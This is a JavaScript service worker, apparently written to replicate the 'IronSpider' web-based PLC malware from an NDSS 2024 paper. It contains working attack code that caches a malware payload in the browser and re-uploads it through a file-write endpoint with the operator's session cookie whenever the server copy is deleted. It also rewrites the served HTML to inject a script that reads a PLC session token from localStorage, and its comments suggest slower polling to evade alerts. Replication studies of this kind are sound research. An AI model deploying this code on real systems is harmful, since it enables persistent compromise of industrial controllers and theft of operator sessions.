// sw.js — IronSpider Resurrection Service Worker
// Research/Educational: NDSS 2024 replication study
// "Compromising Industrial Processes using Web-Based PLC Malware" (Pickren et al.)
//
// Context for the reader
// ─────────────────────
// A service worker (SW) is a JavaScript file that the browser registers as a
// persistent background script for a given origin (scheme + host + port).
// Unlike a regular page script, it:
//   • runs in its own thread, separate from any tab
//   • survives page navigation and tab closure
//   • is stored in the browser's internal profile, NOT in the server's filesystem
//   • can intercept every network request made by the page (fetch events)
//   • has access to CacheStorage — a key/value store keyed by Request objects
//
// The attack described in Section IV-C of the paper exploits all four properties:
//   1. Persistence — SW registration outlives server-side file deletion
//   2. CacheStorage — the malware payload is kept inside the browser
//   3. Same-origin fetch — re-uploading the payload requires no extra credentials
//   4. Fetch interception — the SW can inject code into the live HTML page
//
// This file implements both mechanisms so they can be observed directly.

'use strict';

// ── Constants ─────────────────────────────────────────────────────────────────
const CACHE_NAME     = 'ironspider-v1';  // name of this SW's CacheStorage bucket
const MALWARE_PATH   = '/malware.js';    // server path the SW watches and caches
const UPLOAD_PATH    = '/upload';        // server endpoint that writes files to disk
                                          // (analogous to the CVE-2022-45140 API)
const CHECK_INTERVAL = 5000;             // ms between malware-presence polls
                                          // (5 s for demo; a real attacker might use
                                          //  60 s or longer to stay below alert thresholds)

// Module-level flag: has the resurrection monitor been started in this SW thread?
// The SW thread can be killed by the browser after ~30 s of inactivity and
// restarted on the next incoming fetch.  We use this flag to avoid starting
// duplicate setInterval loops if the thread is still alive.
let monitorRunning = false;

// ─── INSTALL ─────────────────────────────────────────────────────────────────
// The install event fires once, the first time the browser registers this SW.
// It does NOT fire again on subsequent page loads — the SW is already installed.
//
// Goal: store a copy of malware.js in CacheStorage before anything can stop us.
// This is the persistence anchor of the entire attack: even after the operator
// deletes malware.js from the server (factory reset), the SW holds a full copy
// and can re-upload it at any time.
//
// CacheStorage is governed by storage quota (shared with IndexedDB, localStorage,
// etc.), NOT by HTTP cache headers.  The server sends Cache-Control: no-store on
// all responses, which prevents the *browser's* HTTP cache from keeping a copy —
// but that header has no effect on the SW's explicit cache.add() call below.
self.addEventListener('install', event => {
  console.log('[SW] install — caching malware payload from', MALWARE_PATH);

  // self.skipWaiting(): normally a new SW waits in the "waiting" state until all
  // existing clients (tabs) close.  skipWaiting() skips that queue and moves
  // immediately to "activating".  This is important for the attack: we don't
  // want to wait for the operator to close their tab before taking control.
  self.skipWaiting();

  // event.waitUntil() keeps the install phase open until the promise resolves.
  // If the SW is terminated before install completes, the browser will retry.
  event.waitUntil(
    caches.open(CACHE_NAME)
      // cache.add(url) is shorthand for fetch(url) then cache.put(url, response).
      // It fetches malware.js from the server RIGHT NOW, during install, and
      // stores the full HTTP response (headers + body) in the cache bucket.
      .then(cache => cache.add(MALWARE_PATH))
      .then(() => console.log('[SW] malware.js cached successfully'))
      .catch(err  => console.error('[SW] cache.add failed:', err.message))
  );
});

// ─── ACTIVATE ────────────────────────────────────────────────────────────────
// Activate fires after install completes (and after skipWaiting() resolves the
// waiting queue).  The SW is now the controlling worker for this origin.
//
// Goal: immediately claim all open tabs so we intercept their fetch events
// without needing a page reload, then start the resurrection monitor.
self.addEventListener('activate', event => {
  console.log('[SW] activate — claiming clients');

  event.waitUntil(
    // self.clients.claim() makes this SW the controller for every currently-open
    // tab on the origin.  Without this call, tabs that were open *before* the SW
    // registered would not be controlled until they are reloaded.
    self.clients.claim().then(() => {
      console.log('[SW] all clients claimed');
      startMonitor();
    })
  );
});

// ─── FETCH ───────────────────────────────────────────────────────────────────
// Every network request made by a controlled page passes through here first.
// The SW can inspect, modify, block, or replace any request/response.
//
// Two purposes in this implementation:
//
//   (a) WAKE UP: If the browser killed the idle SW thread and restarted it in
//       response to a new fetch, monitorRunning will be false.  Restart the
//       resurrection monitor so it keeps checking even with no open tabs.
//
//   (b) INJECT: When the page requests its own HTML (the root path), the SW
//       modifies the HTML in transit to inject a <script> block.  This block
//       runs inside the page's JavaScript context and demonstrates that the
//       "service workers cannot access DOM or localStorage" rule is NOT a
//       security boundary — it is merely an API restriction that can be routed
//       around by pushing code into the page.
self.addEventListener('fetch', event => {
  // (a) Resume monitoring if we were just restarted from idle termination.
  if (!monitorRunning) {
    startMonitor();
  }

  const url = new URL(event.request.url);

  // (b) Intercept the main HTML page.
  if (url.pathname === '/' || url.pathname === '/index.html') {
    // event.respondWith() replaces the normal fetch with our modified response.
    // If we don't call respondWith(), the browser falls through to the network.
    event.respondWith(injectIntoPage(event.request));
    return;
  }

  // For everything else (CSS, JS, images, API calls) — pass through unchanged.
  // A real attack might intercept /api/sensor-data and return spoofed readings,
  // but here we keep it simple to focus on the core resurrection demonstration.
  event.respondWith(fetch(event.request));
});

// ── Fetch Interception: inject code into the HTML page ───────────────────────
// This function receives the original page request, fetches the real HTML from
// the server, appends a <script> tag, and returns the modified document.
//
// Why this matters:
//   The W3C spec forbids SWs from touching the DOM or localStorage directly.
//   These are *API* restrictions on the SW's global scope — they are not a
//   sandbox boundary enforced by the browser's process model.  The SW is still
//   trusted to intercept and rewrite every response.  By injecting a <script>,
//   it can run arbitrary code in the page's privileged context, where DOM and
//   localStorage are fully accessible.
async function injectIntoPage(request) {
  try {
    // Fetch the real HTML from the server.  Because this fetch happens inside
    // the SW's fetch handler, it is NOT intercepted again (no infinite loop).
    const response = await fetch(request);
    const html     = await response.text();

    // Build the injected script as a string.
    // Note: the closing </script> tag is escaped as <\/script> to prevent the
    // string literal from accidentally terminating the outer <script> block
    // in which this source code lives.
    const injectedScript = `<script id="sw-injected-block">
  // ── Injected by Service Worker via respondWith() ──
  // This code runs inside the PAGE's JavaScript context, not the SW's.
  // It was inserted by the SW mid-flight, before the browser parsed the body.
  // The page's JS engine does not distinguish between server-written and
  // SW-injected script tags — both execute with identical privileges.
  (function swInjection() {
    // Update the visible indicator to confirm the injection took place.
    const el = document.getElementById('sw-dom-injection');
    if (el) {
      el.textContent = 'YES \u2014 injected by SW via respondWith()';
      el.classList.add('status-warn');
    }

    // Read localStorage — something the SW cannot do directly.
    // This proves the injection is a full privilege bypass, not just cosmetic.
    const token = localStorage.getItem('plc-session-token') || '(none stored)';
    const tokenEl = document.getElementById('sw-extracted-token');
    if (tokenEl) tokenEl.textContent = token;

    console.log('[SW-INJECTED] running in page context. localStorage token:', token);
  })();
<\/script>`;

    // Append the injected block just before </body> so it runs after the DOM
    // is parsed but before any deferred scripts complete.
    const modified = html.replace('</body>', injectedScript + '\n</body>');

    // The modified body is longer than the original, so the Content-Length
    // header (if present) would be wrong.  Delete it; the browser will
    // determine the length from the actual response body.
    const headers = new Headers(response.headers);
    headers.delete('content-length');

    return new Response(modified, {
      status:     response.status,
      statusText: response.statusText,
      headers,
    });
  } catch (_err) {
    // If anything fails (e.g. server is down), fall back to the unmodified
    // page.  The injection failing silently is better than a broken page.
    return fetch(request);
  }
}

// ─── RESURRECTION MONITOR ─────────────────────────────────────────────────────
// The monitor is a setInterval loop that runs inside the SW's thread.
// It fires every CHECK_INTERVAL ms and checks whether malware.js still exists
// on the server.  If it has been deleted (factory reset), it triggers resurrection.
//
// Lifecycle note: the browser can terminate an idle SW thread after ~30 seconds
// of no fetch events.  If that happens, the setInterval is destroyed along with
// the thread.  The monitor is restarted in the fetch handler (see above), so
// ANY incoming page request — including background XHR polls from the dashboard
// — is enough to wake the SW and resume monitoring.
function startMonitor() {
  if (monitorRunning) return; // guard against duplicate intervals
  monitorRunning = true;
  console.log(`[SW] resurrection monitor started (interval: ${CHECK_INTERVAL}ms)`);
  setInterval(checkAndResurrect, CHECK_INTERVAL);
}

// Probe the server for malware.js.  If it returns non-2xx or a network error,
// the file has been deleted and resurrection is needed.
async function checkAndResurrect() {
  // Readable timestamp for console logs (HH:MM:SS.mmm)
  const ts = new Date().toISOString().slice(11, 23);
  try {
    // Append a timestamp query parameter to bypass any intermediate HTTP proxy
    // cache.  cache:'no-store' tells the browser's own fetch cache to also skip.
    // We need a live 200/404 from the server, not a stale cached response.
    const resp = await fetch(`${MALWARE_PATH}?_sw=${Date.now()}`, { cache: 'no-store' });

    if (resp.ok) {
      // File is still present — nothing to do.
      console.log(`[SW] [${ts}] malware.js present (HTTP ${resp.status})`);
    } else {
      // Server returned 4xx/5xx — malware.js is gone (or the server is wrong).
      // Treat any non-2xx as "file deleted" and resurrect.
      console.warn(`[SW] [${ts}] malware.js → HTTP ${resp.status} — RESURRECTION TRIGGERED`);
      await resurrect();
    }
  } catch (err) {
    // Network error: either the server is down (hardware replacement scenario)
    // or the machine is offline.  Still attempt resurrection — if the server
    // comes back, the upload in resurrect() will succeed.
    console.warn(`[SW] [${ts}] malware.js → fetch error (${err.message}) — RESURRECTION TRIGGERED`);
    await resurrect();
  }
}

// ─── RESURRECTION SEQUENCE ───────────────────────────────────────────────────
// Three steps to bring malware.js back from deletion:
//
//   Step 1 — Retrieve the payload from CacheStorage.
//             The SW cached this during install.  Even if the server's copy was
//             deleted, our cached copy is intact inside the browser profile.
//
//   Step 2 — POST it to the server's file-write endpoint.
//             In the real IronSpider attack this calls CVE-2022-45140, which
//             allows unauthenticated arbitrary file write via the
//             /network_config?filename= API.  Here we use /upload.
//             Key: the fetch is same-origin, so it carries the operator's session
//             cookie automatically.  No username/password needed.
//
//   Step 3 — Notify all open tabs via postMessage so the UI can update.
async function resurrect() {
  console.log('[SW] *** RESURRECTION SEQUENCE INITIATED ***');
  await notifyClients({ type: 'RESURRECTION_STARTED', timestamp: Date.now() });

  // ── Step 1: read cached payload ──────────────────────────────────────────
  let payload;
  try {
    const cache  = await caches.open(CACHE_NAME);
    // cache.match() returns undefined if the entry is not found (rather than
    // throwing), so we check explicitly.
    const cached = await cache.match(MALWARE_PATH);
    if (!cached) {
      // This can happen if: (a) the SW installed but caching failed, or
      // (b) the browser evicted the entry due to storage pressure.
      // Either way, resurrection is impossible without the payload.
      console.error('[SW] RESURRECTION FAILED — no cached payload');
      await notifyClients({ type: 'RESURRECTION_FAILED', reason: 'No cached payload in CacheStorage' });
      return;
    }
    // .clone() before .text(): Response bodies are one-shot streams.
    // Cloning lets us read the text here without consuming the cached entry.
    payload = await cached.clone().text();
    console.log(`[SW] cached payload retrieved: ${payload.length} bytes`);
  } catch (err) {
    await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Cache read error: ${err.message}` });
    return;
  }

  // ── Step 2: re-upload via the file-write API ──────────────────────────────
  try {
    const uploadResp = await fetch(UPLOAD_PATH, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      // Send filename + content as JSON.  The server validates the filename
      // with a regex before writing, analogous to how a real PLC API would
      // accept a filename parameter.
      body: JSON.stringify({ filename: 'malware.js', content: payload }),
    });

    if (uploadResp.ok) {
      console.log('[SW] *** RESURRECTION COMPLETE — malware.js re-uploaded');
      await notifyClients({ type: 'RESURRECTED', timestamp: Date.now() });
    } else {
      const msg = `Upload returned HTTP ${uploadResp.status}`;
      console.error('[SW] RESURRECTION FAILED —', msg);
      await notifyClients({ type: 'RESURRECTION_FAILED', reason: msg });
    }
  } catch (err) {
    // Network error during upload — server may still be starting after a
    // hardware replacement.  The monitor will try again next interval.
    await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Upload error: ${err.message}` });
  }
}

// ── Notify all open tabs ──────────────────────────────────────────────────────
// self.clients.matchAll() returns all Window clients controlled by this SW.
// includeUncontrolled: true catches tabs that were open before the SW registered
// (they might not be controlled yet but can still receive messages).
// type: 'window' excludes shared workers and other non-tab clients.
async function notifyClients(message) {
  const clients = await self.clients.matchAll({ includeUncontrolled: true, type: 'window' });
  clients.forEach(c => c.postMessage(message));
}
